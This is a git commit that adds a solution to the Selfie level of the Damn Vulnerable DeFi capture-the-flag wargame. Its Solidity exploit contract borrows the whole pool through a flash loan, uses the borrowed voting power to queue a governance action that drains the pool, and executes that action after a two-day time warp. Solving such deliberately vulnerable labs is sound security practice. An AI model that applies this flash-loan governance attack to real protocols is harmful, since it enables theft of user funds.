0b3bbcf0924a357a7985b8ec912b1be99b4ac56b
Aravinds2511 <aravindvasang@gmail.com>
2026-02-24 13:07:37 +0000

    feat: Selfie - vulnerability

--- test/selfie/Selfie.t.sol
+++ test/selfie/Selfie.t.sol
@@ -7,6 +7,9 @@ import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
 
+// My imports
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -62,7 +65,10 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        Hack hack = new Hack(token, governance, pool, recovery);
+        hack.takeFlashLoan(hack);
+        vm.warp(block.timestamp + 2 days);
+        hack.executeAction();
     }
 
     /**
@@ -72,5 +78,48 @@ contract SelfieChallenge is Test {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+contract Hack is IERC3156FlashBorrower {
+    // Get flash loan - all the tokens (though 1 plus 1_000_000e18 is sufficient)
+    // on the same transaction propose the emergency fund transfer execution - repay the flash loan
+    // after two days of time - execute the proposal
+
+    uint256 constant TOKENS_IN_POOL = 1_500_000e18;
+
+    DamnValuableVotes token;
+    SimpleGovernance governance;
+    SelfiePool pool;
+    address recovery;
+
+    constructor(DamnValuableVotes _token, SimpleGovernance _governance, SelfiePool _pool, address _recovery) {
+        token = _token;
+        governance = _governance;
+        pool = _pool;
+        recovery = _recovery;
+    } 
+
+    function takeFlashLoan(IERC3156FlashBorrower fb) external {
+        pool.flashLoan(fb, address(token), TOKENS_IN_POOL, "");
+    }
+
+    function onFlashLoan(
+        address,
+        address,
+        uint256 amount,
+        uint256,
+        bytes calldata
+    ) external returns (bytes32){
+        token.delegate(address(this));
+        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
+        governance.queueAction(address(pool), 0, data);
+        token.approve(address(pool), amount);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    function executeAction() external {
+        uint256 actionId = governance.getActionCounter();
+        governance.executeAction(actionId - 1);
     }
 }
